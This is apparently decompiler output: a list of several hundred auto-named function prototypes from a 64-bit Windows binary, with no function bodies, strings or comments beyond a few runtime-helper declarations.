__int64 __fastcall sub_13F13C4C0(__int64, unsigned int);
__int64 __fastcall sub_13F13C5B0(_QWORD *);
__int64 __fastcall sub_13F13C5E0(_QWORD *);
__int64 __fastcall sub_13F13C610(_QWORD *);
_QWORD *__fastcall sub_13F13C678(__int64, char);
_QWORD *__fastcall sub_13F13C690(_QWORD *, char);
bool __fastcall sub_13F13C6D0(__int64);
__int64 __fastcall sub_13F13C710(_QWORD *, __int64, _QWORD *, unsigned __int64, __int64, char);
char __fastcall sub_13F13C7A0(_QWORD *);
__int64 *__fastcall sub_13F13C890(_QWORD *);
char __fastcall sub_13F13CA20(__int64);
__int64 __fastcall sub_13F13CAE0(__int64);
__int64 __fastcall sub_13F13CB20(__int64);
__int64 __fastcall sub_13F13CB30(__int64);
__int64 __fastcall sub_13F13CB40(__int64);
__int64 __fastcall sub_13F13CBB0(_QWORD *, __int64, __int64, int);
__int64 __fastcall sub_13F13CD90(__int64);
__int64 __fastcall sub_13F13CDA0(_QWORD *, __int64, unsigned __int64 *, __int64, char);
void __fastcall sub_13F13CE50(__int64, __int64, _DWORD *);
void __fastcall sub_13F13CF40(__int64, __int64, _QWORD *);
__int64 __fastcall sub_13F13D020(_QWORD *, unsigned __int64);
__int64 __fastcall sub_13F13D200(_QWORD *, unsigned __int64);
__int64 *__fastcall sub_13F13D3E0(__int64 ******, __int64, unsigned __int64, unsigned int *);
__int64 *__fastcall sub_13F13DEA0(__int64 ******, __int64, unsigned __int64, __int64 *);
__int64 __fastcall sub_13F13E930(_QWORD *);
void __noreturn sub_13F13E9F0();
unsigned __int64 __fastcall sub_13F13EA10(__int64, unsigned __int64);
_QWORD *__fastcall sub_13F13EA90(unsigned __int64 *, _QWORD *, __int64, __int64);
_QWORD *__fastcall sub_13F13EC50(unsigned __int64 *, _QWORD *, __int64, __int64);
__int64 sub_13F13EE10();
unsigned __int64 __fastcall sub_13F13F220(void (__fastcall *)(__m128i *, __int64, _QWORD), void (__fastcall *)(__m128i *, __m128i *, __m128i *, __m128i *, __int64, unsigned int), __int64, unsigned int, __m128i *, const __m128i *, __m128i *, unsigned __int64, char);
__int64 __fastcall sub_13F13F530(__m128i *, __m128i *, __m128i *, __m128i *, const __m128i *, unsigned int);
__int64 __fastcall sub_13F13F630(__m128i *, __m128i *_RDX, unsigned int);
unsigned __int64 __fastcall sub_13F13F6A0(__int64, unsigned int, __m128i *, const __m128i *, __m128i *, unsigned __int64, char);
__int64 __fastcall sub_13F13F700(__m128i *, int);
__int32 *__fastcall sub_13F13F770(const __m128i *, unsigned __int64, __m128i *);
__int64 __fastcall sub_13F13F8E0(__m128i *, const __m128i *, unsigned __int64, int);
void __fastcall sub_13F13FBF0(__m128i *, const __m128i *, unsigned __int64, int);
__int64 sub_13F140020();
__int64 __fastcall sub_13F1400D0(); // weak
_QWORD *__fastcall sub_13F1401D0(_QWORD *);
// void __cdecl _security_check_cookie(uintptr_t StackCookie);
__int64 __fastcall sub_13F140244(); // weak
__int64 __fastcall sub_13F1403A4(); // weak
__int64 __fastcall sub_13F1403CC(_DWORD *);
__int64 __fastcall sub_13F1403FC(_DWORD *);
void __fastcall sub_13F14045C(_DWORD *);
__int64 sub_13F1404C4();
__int64 __fastcall sub_13F140514(unsigned int);
void sub_13F14058C();
__int64 __fastcall sub_13F14059C(__int64);
char sub_13F1405D8();
char __fastcall sub_13F140614(int);
char sub_13F140660();
bool __fastcall sub_13F140738(__int64);
__int64 __fastcall sub_13F1407D4(char);
char __fastcall sub_13F1407F8(char);
__int64 __fastcall sub_13F140824(__int64);
__int64 __fastcall sub_13F140874(__int64);
__int64 __fastcall sub_13F14088C(_QWORD, _QWORD); // weak
_QWORD *__fastcall sub_13F140894(_QWORD *, char);
// __int64 __fastcall _report_rangecheckfailure(_QWORD, _QWORD, _QWORD, _QWORD); weak
__int64 __fastcall sub_13F140B5C(); // weak
__int64 __fastcall sub_13F140C14(); // weak
__int64 __fastcall sub_13F140C24(); // weak
__int64 __fastcall sub_13F140C40();
__int64 sub_13F140DBC();
__int64 __fastcall sub_13F140ECC(__int64, __int64, __int64);
__int64 __fastcall sub_13F140F38(__int64, __int64, __int64, __int64 (__fastcall *)(__int64));
__int64 __fastcall sub_13F140F9C(_QWORD, _QWORD); // weak
__int64 sub_13F140FA4();
void **__fastcall sub_13F141160(__int64, __int64, __int64);
void sub_13F1411D0();
void __fastcall sub_13F1411D8(unsigned int);
__int64 sub_13F141324();
bool sub_13F14132C();
void sub_13F141380();
__int64 __fastcall sub_13F141390(_QWORD *);
_QWORD *__fastcall sub_13F1413C8(_QWORD *, __int64);
_QWORD *__fastcall sub_13F141408(_QWORD *);
void __noreturn sub_13F141428();
void __noreturn sub_13F141448();
__int64 sub_13F141468();
uintptr_t sub_13F141474();
__int64 sub_13F141520();
__int64 *sub_13F141528();
__int64 *sub_13F141530();
__int64 sub_13F14154C();
__int64 *sub_13F141558();
__int64 *sub_13F141560();
void sub_13F141568();
void sub_13F1415A4();
__int64 __fastcall sub_13F1415E0(__int64 a1, int a2);
__int64 __fastcall sub_13F1416E8(__int64);
_DWORD *__fastcall sub_13F141708(_DWORD *);
__int64 __fastcall sub_13F14171C(__int64);
_QWORD *__fastcall sub_13F141744(_QWORD *, __int64);
__int64 *__fastcall sub_13F141784(__int64 *, __int64);
__int64 __fastcall sub_13F1417C0(_QWORD); // weak
char __fastcall sub_13F1417C8(__int64 *);
__int64 __fastcall sub_13F1417E4(__int64, __int64);
__int64 __fastcall sub_13F141894(__int64 a1, volatile signed __int32 *a2);
__int64 __fastcall sub_13F141900(volatile signed __int32 *);
__int64 __fastcall sub_13F14196C(__int64, _QWORD *);
__int64 __fastcall sub_13F1419D8(_QWORD); // weak
__int64 __fastcall sub_13F1419E0(__int64);
__int64 __fastcall sub_13F141A20(volatile signed __int32 *);
bool __fastcall sub_13F141A5C(__int64, __int64, char);
__int64 __fastcall sub_13F141B70(__int64);
char __fastcall sub_13F141B90(__int64);
__int64 __fastcall sub_13F141BB8(__int64, __int64);
__int64 __fastcall sub_13F141BDC(_QWORD); // weak
void __fastcall sub_13F141BE4(volatile signed __int32 *);
void __fastcall sub_13F141BE8(__int64);
char __fastcall sub_13F141BF4(__int64);
char __fastcall sub_13F141CA8(_DWORD *);
signed __int64 __fastcall sub_13F141D48(signed __int64, signed __int64);
char __fastcall sub_13F141DD0(volatile signed __int32 *);
__int64 __fastcall sub_13F141DE8(_DWORD *, int, unsigned int);
signed __int64 __fastcall sub_13F141E5C(__int64);
char __fastcall sub_13F141E98(signed __int64);
char __fastcall sub_13F141EF8(signed __int64 a1, int a2);
char __fastcall sub_13F141FB8(__int64);
__int64 __fastcall sub_13F1420DC(__int64, __int64);
void sub_13F14212C();
_QWORD *__fastcall sub_13F142194(_QWORD *, char);
unsigned __int64 sub_13F1421D8();
__int64 __fastcall sub_13F1422DC(_QWORD, _QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall sub_13F1422E4(_QWORD); // weak
__int64 __fastcall sub_13F1422EC();
__int64 __fastcall sub_13F142340(_QWORD, _QWORD); // weak
__int64 __fastcall sub_13F142348(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _DWORD, _DWORD); // weak
__int64 __fastcall sub_13F142350(__int64, __int64, __int64);
__int64 __fastcall sub_13F1423B0(__int64);
__int64 __fastcall sub_13F1423D4(unsigned int *);
__int64 __fastcall sub_13F1424A0(unsigned int, unsigned int *);
__int64 sub_13F1425E8();
__int64 __fastcall sub_13F142634(__int64, __int64);
__int64 __fastcall sub_13F1426A0(_QWORD); // weak
__int64 __fastcall sub_13F1426A8(_QWORD); // weak
__int64 sub_13F1426B0();
__int64 __fastcall sub_13F1426B8(__int64, __int64, __int64);
__int64 __fastcall sub_13F14271C(__int64, _QWORD *);
__int64 sub_13F142770();
__int64 __fastcall sub_13F1427B4(_QWORD, _QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall sub_13F1427BC(_QWORD); // weak
__int64 sub_13F1427C4(void); // weak
__int64 sub_13F1427CC();
__int64 __fastcall sub_13F142810(_QWORD); // weak
__int64 __fastcall sub_13F142818(_QWORD); // weak
__int64 sub_13F142820();
__int64 __fastcall sub_13F142864(_QWORD); // weak
void sub_13F14286C();
void sub_13F142878();
unsigned __int64 __fastcall sub_13F142890(__int64);
__int64 sub_13F14289C();
__int64 sub_13F1428E4();
uintptr_t sub_13F14291C();
__int64 __fastcall sub_13F142980(__int64, __int64);
__int64 sub_13F1429D0();
__int64 __fastcall sub_13F142A78();
__int64 __fastcall sub_13F142AEC();
__int64 sub_13F142B40();
__int64 sub_13F142B8C();
__int64 __fastcall sub_13F142BD8(volatile __int32 *);
__int64 __fastcall sub_13F142C20(_DWORD *);
__int64 __fastcall sub_13F142C2C(); // weak
char __fastcall sub_13F142C34(volatile __int32 *);
__int64 __fastcall sub_13F142C6C(); // weak
_QWORD *__fastcall sub_13F142C9C(_QWORD *);
_QWORD *__fastcall sub_13F142CB4(_QWORD *);
_QWORD *__fastcall sub_13F142CCC(_QWORD *, __int64);
_QWORD *__fastcall sub_13F142D18(_QWORD *);
_QWORD *__fastcall sub_13F142D30(_QWORD *);
_QWORD *__fastcall sub_13F142D48(_QWORD *);
_QWORD *__fastcall sub_13F142D60(_QWORD *, __int64);
_QWORD *__fastcall sub_13F142DAC(_QWORD *);
_QWORD *__fastcall sub_13F142DC4(_QWORD *, __int64);
_QWORD *__fastcall sub_13F142E10(_QWORD *);
_QWORD *__fastcall sub_13F142E28(_QWORD *);
__int64 __fastcall sub_13F142E40(__int64, int);
__int64 __fastcall sub_13F142E5C(__int64, int);
_QWORD *__fastcall sub_13F142E78(_QWORD *);
__int64 __fastcall sub_13F142E90();
_QWORD *__fastcall sub_13F142ED0();
_QWORD *__fastcall sub_13F142EFC(_QWORD *, __int64);
__int64 __fastcall sub_13F142F28(__int64);
_QWORD *__fastcall sub_13F143048(_QWORD *, __int64);
_QWORD *__fastcall sub_13F143088(_QWORD *);
_QWORD *__fastcall sub_13F1430A0(_QWORD *, __int64);
__int64 __fastcall sub_13F1430E0(__int64);
__int64 __fastcall sub_13F1430F0(__int64, __int64);
__int64 __fastcall sub_13F143228(_QWORD *);
__int64 __fastcall sub_13F143250(__int64, int, unsigned int, __int64);
void sub_13F143324();
__int64 __fastcall sub_13F1433E0(__int64 *);
__int64 __fastcall sub_13F143410(_QWORD *, __int64);
__int64 sub_13F143420();
__int64 sub_13F1435A8();
_DWORD *__fastcall sub_13F1435CC(__int64, __int64);
__int64 __fastcall sub_13F1436F0(__int64);
__int64 __fastcall sub_13F143850(__int64);
__int64 sub_13F1438C8(void); // weak
__int64 __fastcall sub_13F1438D0(__int64, __int64);
__int64 __fastcall sub_13F14394C(); // weak
__int64 __fastcall sub_13F143A38(__int64, unsigned int, unsigned int);
__int64 __fastcall sub_13F143AE4(__int64, __int64);
_QWORD *__fastcall sub_13F143B30(__int64);
__int64 __fastcall sub_13F143F0C(__int64);
bool __fastcall sub_13F143F84(__int64);
void __fastcall sub_13F144188(__int64, int, unsigned int, unsigned int, unsigned int, unsigned int);
void __fastcall sub_13F144324(__int64, unsigned int, unsigned int);
__int64 __fastcall sub_13F1444FC(__int64, __int64);
char *__fastcall sub_13F14477C(__int64, __int64, unsigned int, int, char);
char *__fastcall sub_13F144828(__int64, __int64, __int64, unsigned int, unsigned int);
__int64 __fastcall sub_13F1449FC(__int64);
__int64 __fastcall sub_13F144A14(__int64);
__int64 __fastcall sub_13F144B2C(__int64, unsigned int *, unsigned int *, __int64, int, unsigned int);
__int64 __fastcall sub_13F144EF4(__int64, unsigned int, __int64, int);
char __fastcall sub_13F145018(__int64, _DWORD *, _DWORD *, __int64, unsigned int);
__int64 __fastcall sub_13F145170(__int64);
__int64 __fastcall sub_13F1451AC(__int64);
__int64 sub_13F1451B0();
__int64 __fastcall sub_13F145234(__int64, _DWORD *);
__int64 __fastcall sub_13F145374(__int64);
__int64 __fastcall sub_13F14537C(__int64);
__int64 __fastcall sub_13F14538C(__int64);
__int64 __fastcall sub_13F145398(__int64);
__int64 __fastcall sub_13F1453A0(__int64);
__int64 __fastcall sub_13F1453A8(__int64);
__int64 __fastcall sub_13F1453FC(__int64);
__int64 __fastcall sub_13F145434(); // weak
__int64 __fastcall sub_13F1454B8(__int64);
__int64 sub_13F1454C0(void); // weak
__int64 __fastcall sub_13F1454C8(_QWORD, _QWORD); // weak
__int64 __fastcall sub_13F1454D0(_QWORD); // weak
__int64 sub_13F1454D8();
__int64 sub_13F1454E8();
__int64 __fastcall sub_13F14551C(__int64, __int64, __int64);
__int64 __fastcall sub_13F145668(__int64, __int64, __int64);
void __fastcall sub_13F1457BC(__int64);
char __fastcall sub_13F145820(__int64, __int64, unsigned __int16, unsigned __int16, unsigned __int64, int, char);
__int64 __fastcall sub_13F145A08(__int64, __int64);
__int64 sub_13F145B08();
__int64 __fastcall sub_13F145DC8(__int64, __int64, char, char);
void **__fastcall sub_13F145FC4(__int64, int, __int64, __int64);
__int64 __fastcall sub_13F146098(__int64, __int64);
void __fastcall sub_13F1461EC(__int64);
__int64 __fastcall sub_13F1462F8(__int64);
__int64 __fastcall sub_13F14633C(__int64, int);
__int64 __fastcall sub_13F1465C8(__int64, __int64, unsigned int, unsigned int, int);
__int64 __fastcall sub_13F1469A0(__int64);
__int64 __fastcall sub_13F1469B0(__int64, __int64, int);
__int64 __fastcall sub_13F146A14(__int64);
__int64 __fastcall sub_13F146B08(__int64, __int64, unsigned int, int);
char __fastcall sub_13F146BAC(__int64, __int64, __int64, int);
__int64 __fastcall sub_13F146CD8(__int64, __int64);
__int64 __fastcall sub_13F146D80(__int64, __int64, char);
__int64 __fastcall sub_13F146F20(__int64, __int64, unsigned int);
__int64 __fastcall sub_13F146F84(__int64, __int64, unsigned int, int);
__int64 __fastcall sub_13F147180(__int64);
__int64 sub_13F1471D4();
__int64 __fastcall sub_13F1472EC(__int64 *a1, unsigned int a2);
char *__fastcall sub_13F1474A8(__int64, __int64);
_QWORD *__fastcall sub_13F147668(__int64, __int64, char);
__int64 __fastcall sub_13F147780(__int64, __int64);
__int64 __fastcall sub_13F1478A0(__int64, __int64);
_DWORD *__fastcall sub_13F147918(__int64, __int64, __int64, __int64, _DWORD *, __int64);
__int64 sub_13F147980();
__int64 __fastcall sub_13F147A00(__int64, __int64, int, int);
__int64 __fastcall sub_13F147B30(__int64);
__int64 __fastcall sub_13F147B44(__int64, _OWORD **);
_QWORD *__fastcall sub_13F147F34(_QWORD *, __int64);
_QWORD *__fastcall sub_13F147F74(_QWORD *, __int64);
__int64 __fastcall sub_13F147FB4(__int64);
__int64 __fastcall sub_13F147FD0(__int64);
__int64 __fastcall sub_13F1480C4(__int64);
__int64 __fastcall sub_13F1481E8(__int64, __int64);
__int64 __fastcall sub_13F148208(__int64, __int64);
__int64 __fastcall sub_13F148214(__int64, __int64);
__int64 (__fastcall **__fastcall sub_13F14824C(__int64, __int64))();
__int64 __fastcall sub_13F14833C(_DWORD **);
_QWORD *__fastcall sub_13F148358(_QWORD *, char);
signed __int64 __fastcall sub_13F148384(signed __int64, char);
_QWORD *__fastcall sub_13F1483B8(_QWORD *, char);
_QWORD *__fastcall sub_13F1483E4(_QWORD *, char);
_QWORD *__fastcall sub_13F148410(_QWORD *, char);
_QWORD *__fastcall sub_13F14843C(_QWORD *, char);
__int64 __fastcall sub_13F148468(__int64, __int64);
_QWORD *__fastcall sub_13F14849C(_QWORD *, char);
__int64 __fastcall sub_13F1484C8(__int64, signed __int64);
signed __int64 __fastcall sub_13F148644(__int64, __int64);
void __fastcall sub_13F14869C(__int64, _QWORD *);
signed __int64 __fastcall sub_13F148710(__int64, _QWORD *, unsigned int);
__int64 __fastcall sub_13F148800(__int64, __int64, __int64);
__int64 __fastcall sub_13F14888C(__int64, __int64);
char __fastcall sub_13F14891C(volatile signed __int32 *);
_QWORD *__fastcall sub_13F148984(volatile signed __int32 *, char);
__int64 __fastcall sub_13F148A2C(volatile signed __int32 *);
__int64 __fastcall sub_13F148A50(__int64);
__int64 (*__fastcall sub_13F148A94(__int64, unsigned int))(void);
__int64 __fastcall sub_13F148AF4(__int64);
__int64 __fastcall sub_13F148B60(__int64);
__int64 __fastcall sub_13F148BBC(__int64);
__int64 sub_13F148BC4();
__int64 sub_13F148C04();
__int64 __fastcall sub_13F148CB4(__int64, __int64);
__int64 __fastcall sub_13F148DD0(__int64);
__int64 __fastcall sub_13F148E38(__int64, unsigned int);
__int64 __fastcall sub_13F148F0C(__int64);
__int64 __fastcall sub_13F149020(int *, int *);
_QWORD *sub_13F1490A8();
__int64 __fastcall sub_13F1490F0(__int64);
_QWORD *__fastcall sub_13F149118(__int64 *);
__int64 __fastcall sub_13F149148(__int64);
__int64 __fastcall sub_13F149168(__int64);
__int64 __fastcall sub_13F149194(volatile __int32 *);
__int64 __fastcall sub_13F1491F8(__int64);
__int64 __fastcall sub_13F149264(volatile signed __int32 *, __int64, char);
__int64 sub_13F1492D4();
__int64 sub_13F1492E0();
void __fastcall sub_13F149304(__int64);
__int64 __fastcall sub_13F14938C(__int64);
__int64 *__fastcall sub_13F149520(int *, _DWORD *, _DWORD *);
__int64 __fastcall sub_13F14959C(__int64);
__int64 __fastcall sub_13F149600(__int64, _DWORD *);
__int64 __fastcall sub_13F149668(__int64, int, int, _DWORD *, __int64);
__int64 __fastcall sub_13F1496EC(__int64, int, int, _DWORD *);
char __fastcall sub_13F149778(__int64, __int64, __int64, int);
char __fastcall sub_13F1498E4(__int64);
char __fastcall sub_13F149918(__int64);
__int64 __fastcall sub_13F149AC8(__int64);
__int64 __fastcall sub_13F149ADC(__int64, __int64, _DWORD *);
__int64 sub_13F149BE4();
_QWORD *__fastcall sub_13F149CBC(__int64, char);
__int64 __fastcall sub_13F149D3C(__int64, char);
__int64 __fastcall sub_13F149E78(__int64);
__int64 __fastcall sub_13F149E88(__int64);
__int64 sub_13F149E98();
__int64 __fastcall sub_13F149EA8(__int64);
__int64 __fastcall sub_13F149F2C(__int64, _DWORD *, int, __int64);
__int64 __fastcall sub_13F149FA4(__int64, __int64, __int64);
__int64 __fastcall sub_13F149FE4(__int64);
__int64 *__fastcall sub_13F14A020(__int64, __int64 *);
_QWORD *__fastcall sub_13F14A040(__int64, __int64, __int64);
__int64 __fastcall sub_13F14A0A4(__int64);
__int64 __fastcall sub_13F14A0BC(char);
__int64 __fastcall sub_13F14A160(__int64, int);
void __fastcall sub_13F14A198(__int64, int);
void __fastcall sub_13F14A240(unsigned int *, unsigned int);
bool __fastcall sub_13F14A2E4(__int64);
__int64 __fastcall sub_13F14A2FC(__int64);
void __fastcall sub_13F14A304(__int64);
void __fastcall sub_13F14A880(__int64);
_QWORD *__fastcall sub_13F14A888(int *, _DWORD *, _DWORD *);
__int64 __fastcall sub_13F14A964(__int64, __int64);
__int64 __fastcall sub_13F14AA74(__int64 (__fastcall **)(__int64), __int64 (__fastcall *)(__int64), __int64 (__fastcall *)(__int64), __int64);
__int64 __fastcall sub_13F14AAA0(__int64, __int64);
bool __fastcall sub_13F14AB18(__int64, _DWORD *);
__int64 __fastcall sub_13F14AB7C(__int64, __int64);
char __fastcall sub_13F14ABA0(__int64, __int64);
void __fastcall sub_13F14AC4C(__int64, signed __int64);
__int64 __fastcall sub_13F14AF24(volatile signed __int32 *);
__int64 __fastcall sub_13F14B000(volatile signed __int32 *);
char __fastcall sub_13F14B0D8(__int64, __int64, __int64);
__int64 __fastcall sub_13F14B188(__int64);
__int64 __fastcall sub_13F14B1A0(__int64);
void __fastcall sub_13F14B22C(__int64, __int64);
__int64 __fastcall sub_13F14B314(signed __int64);
__int64 __fastcall sub_13F14B36C(volatile signed __int32 *);
__int64 __fastcall sub_13F14B390(__int64, __int64);
void __fastcall sub_13F14B404(__int64, __int64, char);
__int64 __fastcall sub_13F14B450(__int64, __int64 (__fastcall ***)(_QWORD, __int64));
__int64 __fastcall sub_13F14B4BC(__int64);
char __fastcall sub_13F14B550(__int64, signed __int64, int, char);
char __fastcall sub_13F14B6E4(__int64, signed __int64, int, char);
_QWORD *__fastcall sub_13F14B840(__int64);
void __fastcall sub_13F14B8AC(__int64, __int64);
char __fastcall sub_13F14B92C(__int64, signed __int64);
char __fastcall sub_13F14B940(__int64);
void __fastcall sub_13F14B95C(__int64, __int64 (__fastcall ****)(_QWORD), unsigned int);
__int64 __fastcall sub_13F14BA70(__int64);
__int64 __fastcall sub_13F14BAE0(__int64);
__int64 sub_13F14BB58();
char __fastcall sub_13F14BB74(__int64);
__int64 __fastcall sub_13F14BB98(__int64, __int64, __int64);
__int64 __fastcall sub_13F14BC10(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F14BC94(__int64, __int64);
char __fastcall sub_13F14BCC8(__int64, __int64, __int64);
char __fastcall sub_13F14BD04(__int64, __int64, __int64, int);
__int64 sub_13F14BD9C();
__int64 __fastcall sub_13F14BE50(__int64, _DWORD *, _DWORD *, _DWORD *);
__int64 __fastcall sub_13F14C0A0(volatile signed __int32 *);
char __fastcall sub_13F14C174(__int64);
char __fastcall sub_13F14C2AC(__int64, __int64);
char __fastcall sub_13F14C2B4(__int64);
char __fastcall sub_13F14C2BC(__int64);
__int64 __fastcall sub_13F14C304(__int64, int);
void sub_13F14C3D4();
__int64 __fastcall sub_13F14C45C(__int64, _DWORD *);
__int64 __fastcall sub_13F14C4BC(__int64);
__int64 __fastcall sub_13F14C504(__int64, int);
__int64 __fastcall sub_13F14C550(__int64);
char __fastcall sub_13F14C594(volatile signed __int32 *, __int64);
__int64 __fastcall sub_13F14C680(__int64, char);
__int64 __fastcall sub_13F14C6F4(int *);
__int64 __fastcall sub_13F14C774(__int64, __int64, char, unsigned __int8);
_QWORD *__fastcall sub_13F14C80C(_QWORD *, __int64, __int64, char, unsigned __int8);
_QWORD *__fastcall sub_13F14C8EC(_QWORD *);
_QWORD *__fastcall sub_13F14C910(_QWORD *);
__int64 (__fastcall **__fastcall sub_13F14C938(_QWORD *))();
unsigned __int64 __fastcall sub_13F14C968(_QWORD *);
char __fastcall sub_13F14C9A0(_QWORD *);
char __fastcall sub_13F14C9E0(__int64 **);
_QWORD *__fastcall sub_13F14CA8C(_QWORD *, char);
__int64 __fastcall sub_13F14CAE4(__int64);
__int64 __fastcall sub_13F14CB10(__int64, __int64);
__int64 __fastcall sub_13F14CB90(__int64, __int64 (__fastcall ***)(_QWORD, _QWORD, _QWORD));
__int64 __fastcall sub_13F14CBD4(__int64);
__int64 __fastcall sub_13F14CC3C(__int64 (__fastcall ***)(_QWORD, _QWORD, _QWORD));
__int64 sub_13F14CC50();
__int64 __fastcall sub_13F14CD04(__int64);
char __fastcall sub_13F14CD2C(__int64);
char __fastcall sub_13F14CD6C(__int64, _QWORD *, __int64);
char __fastcall sub_13F14CDC0(__int64, _QWORD *, __int64);
char __fastcall sub_13F14CE74(__int64, _QWORD *);
char __fastcall sub_13F14CEC0(__int64, _QWORD *);
signed __int64 __fastcall sub_13F14CF08(volatile signed __int64 *);
__int64 __fastcall sub_13F14CF60(__int64, _QWORD *, __int64);
__int64 *__fastcall sub_13F14D048(__int64 *, char);
char __fastcall sub_13F14D0B4(__int64);
char __fastcall sub_13F14D0F0(_BYTE *);
char __fastcall sub_13F14D114(_BYTE *);
char __fastcall sub_13F14D158(__int64);
bool __fastcall sub_13F14D190(__int64 a1, int a2);
char __fastcall sub_13F14D21C(_QWORD *);
char __fastcall sub_13F14D2B0(_QWORD *);
char __fastcall sub_13F14D380(__int64);
signed __int64 __fastcall sub_13F14D570(__int64 **, __int64);
__int64 __fastcall sub_13F14D63C(__int64 **, unsigned int);
bool __fastcall sub_13F14D768(__int64 **a1, __int64 a2, int a3);
__int64 __fastcall sub_13F14D8AC(__int64 *, unsigned __int64, char, unsigned int);
__int64 __fastcall sub_13F14DC58(__int64, __int64, char);
__int64 __fastcall sub_13F14DDA4(__int64);
__int64 __fastcall sub_13F14DDC0(__int64, __int64);
__int64 __fastcall sub_13F14DDE0(__int64, __int64);
__int64 __fastcall sub_13F14DE00(__int64, __int64);
void **__fastcall sub_13F14DE6C(__int64, __int64);
void __fastcall sub_13F14DEF8(__int64);
_QWORD *__fastcall sub_13F14DF18(_QWORD *, char);
__int64 __fastcall sub_13F14DF44(__int64, __int64);
__int64 __fastcall sub_13F14DF78(__int64, signed __int64);
void __fastcall sub_13F14E0F8(__int64, __int64, char);
void __fastcall sub_13F14E148(volatile signed __int32 *, _QWORD *);
__int64 __fastcall sub_13F14E1C0(__int64, signed __int32);
bool __fastcall sub_13F14E230(__int64, signed __int32);
void __fastcall sub_13F14E26C(__int64, __int64);
char __fastcall sub_13F14E374(__int64);
char __fastcall sub_13F14E404(__int64);
char __fastcall sub_13F14E40C(unsigned int *, _QWORD *);
__int64 __fastcall sub_13F14E47C(__int64, __int64);
__int64 __fastcall sub_13F14E4D8(__int64, __int64);
__int64 sub_13F14E5A0();
__int64 __fastcall sub_13F14E5B0(__int64);
void __fastcall sub_13F14E658(__int64, __int64);
__int64 __fastcall sub_13F14E82C(__int64);
__int64 __fastcall sub_13F14E838(__int64);
__int64 __fastcall sub_13F14E844(__int64);
__int64 __fastcall sub_13F14E850(__int64);
char __fastcall sub_13F14E85C(int *, _QWORD *, _QWORD *);
void __fastcall sub_13F14E910(__int64, int);
char __fastcall sub_13F14E98C(__int64);
__int64 __fastcall sub_13F14E9A0(__int64);
__int64 __fastcall sub_13F14E9A4(__int64);
__int64 __fastcall sub_13F14E9B8(__int64);
bool __fastcall sub_13F14E9DC(__int64, __int64, int);
__int64 __fastcall sub_13F14EAF4(__int64);
__int64 __fastcall sub_13F14EBA8(__int64);
__int64 __fastcall sub_13F14EBDC(__int64, __int64);
__int64 __fastcall sub_13F14EBF0(__int64);
void __fastcall sub_13F14EC94(__int64);
void __fastcall sub_13F14EC9C(__int64, __int64);
char __fastcall sub_13F14ED5C(__int64, signed __int64, int, char);
void __fastcall sub_13F14EE9C(__int64, _QWORD **);
void __fastcall sub_13F14EF0C(__int64, __int64);
__int64 sub_13F14EF20();
__int64 __fastcall sub_13F14EF30(__int64, __int64);
__int64 sub_13F14EF64(void); // weak
char __fastcall sub_13F14EF6C(__int64);
__int64 __fastcall sub_13F14F07C(__int64, unsigned __int8 (__fastcall *)(_QWORD, __int64), __int64, unsigned __int8 (__fastcall *)(__int64, __int64));
__int64 __fastcall sub_13F14F088(__int64);
void **sub_13F14F17C();
__int64 __fastcall sub_13F14F218(__int64, int);
__int64 __fastcall sub_13F14F2DC(__int64, int);
__int64 __fastcall sub_13F14F2EC(int *);
__int64 __fastcall sub_13F14F36C(__int64, __int64, __int64, int);
_QWORD *__fastcall sub_13F14F3F4(_QWORD *, __int64);
_QWORD *__fastcall sub_13F14F434(_QWORD *);
signed __int64 __fastcall sub_13F14F44C(signed __int64, __int64, char);
_QWORD *__fastcall sub_13F14F5D0(_QWORD *, __int64);
__int64 *__fastcall sub_13F14F610(_QWORD *);
void __fastcall sub_13F14F640(__int64);
char __fastcall sub_13F14F670(__int64, __int64);
__int64 __fastcall sub_13F14F78C(__int64);
_QWORD *__fastcall sub_13F14F7A4(_QWORD *, char);
_QWORD *__fastcall sub_13F14F7F8(_QWORD *, char);
_QWORD *__fastcall sub_13F14F850(_QWORD *, char);
_QWORD *__fastcall sub_13F14F8A8(_QWORD *, char);
_QWORD *__fastcall sub_13F14F8D4(int *, _QWORD *, _QWORD *);
__int64 __fastcall sub_13F14F950(__int64, __int64);
_QWORD *__fastcall sub_13F14F9D8(int *, _QWORD *, _QWORD *);
void __fastcall sub_13F14FAB4(__int64, char);
__int64 __fastcall sub_13F14FC80(__int64, __int64);
__int64 __fastcall sub_13F14FCDC(__int64);
void __fastcall sub_13F14FDD8(__int64);
void __fastcall sub_13F14FE64(__int64, char, __int64);
void __fastcall sub_13F14FF58(__int64, __int64, __int64);
void __fastcall sub_13F14FF90(__int64, __int64);
void __fastcall sub_13F150050(__int64, __int64, char);
bool __fastcall sub_13F150104(__int64, _QWORD *);
__int64 __fastcall sub_13F150110(__int64);
void __fastcall sub_13F150140(__int64, __int64);
__int64 __fastcall sub_13F1502B8(__int64 (__fastcall ***)(_QWORD, __int64));
__int64 __fastcall sub_13F1502D8(__int64);
__int64 __fastcall sub_13F1502F0(__int64, __int64);
__int64 __fastcall sub_13F150480(__int64);
__int64 __fastcall sub_13F150488(__int64);
__int64 __fastcall sub_13F1504E4(__int64);
bool __fastcall sub_13F1505D0(__int64);
bool __fastcall sub_13F1505E0(__int64);
char __fastcall sub_13F1505EC(__int64, __int64);
__int64 __fastcall sub_13F150654(__int64);
__int64 __fastcall sub_13F15065C(__int64, __int64, __int64, int);
void __fastcall sub_13F1506D4(__int64, __int64);
__int64 __fastcall sub_13F1507A0(__int64, __int64);
void __fastcall sub_13F1507DC(__int64, __int64);
char __fastcall sub_13F15090C(__int64, int);
char __fastcall sub_13F150938(__int64, __int64);
bool __fastcall sub_13F150958(__int64, char);
bool __fastcall sub_13F1509F4(volatile signed __int32 *, signed __int32 *, signed __int32, int);
__int64 *__fastcall sub_13F150A7C(__int64 *, _OWORD **);
__int64 *sub_13F150AC4(__int64 *, unsigned __int64, ...);
_QWORD *__fastcall sub_13F150AF8(_QWORD *, __int64);
_QWORD *__fastcall sub_13F150B38(_QWORD *, __int64);
_QWORD *__fastcall sub_13F150B78(_QWORD *, __int64);
__int64 __fastcall sub_13F150BB8(_QWORD *);
_QWORD *__fastcall sub_13F150BC8(_QWORD *, __int64 *);
__int64 __fastcall sub_13F150BEC(_QWORD *, unsigned int);
__int64 __fastcall sub_13F150C2C(__int64 *, unsigned __int64, __int64 *);
__int64 __fastcall sub_13F150D6C(__int64 *, __int64);
